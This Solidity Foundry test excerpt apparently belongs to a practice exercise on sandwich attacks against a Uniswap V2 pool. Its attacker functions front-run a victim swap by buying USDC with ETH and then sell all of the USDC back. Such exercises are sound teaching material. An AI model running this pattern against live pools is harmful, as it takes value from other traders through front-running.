...
contract SandwichPracticeTest is SandwichSetUp {
    ...
    function _attackerAction1() internal {
        ...
        path[0] = address(weth);
        path[1] = address(usdc);
        uint256 amountsETH = 2.61 ether;
        uint256 amountsOut = IUniswapV2Router01(uniswapV2Router).getAmountsOut( amountsETH, path)[1];
        IUniswapV2Router01(uniswapV2Router).swapExactETHForTokens{ value : amountsETH }(0, path, address(attacker), block.timestamp + 10);
        vm.stopPrank();
    }
    ...
    function _attackerAction2() internal {
        ...
        path[0] = address(usdc);
        path[1] = address(weth);
        uint256 usdcAmount = TestERC20(usdc).balanceOf(attacker);
        usdc.approve(address(uniswapV2Router), usdcAmount);
        IUniswapV2Router01(uniswapV2Router).swapExactTokensForETH(usdcAmount, 0, path, address(attacker), block.timestamp + 10);
        vm.stopPrank();
    }
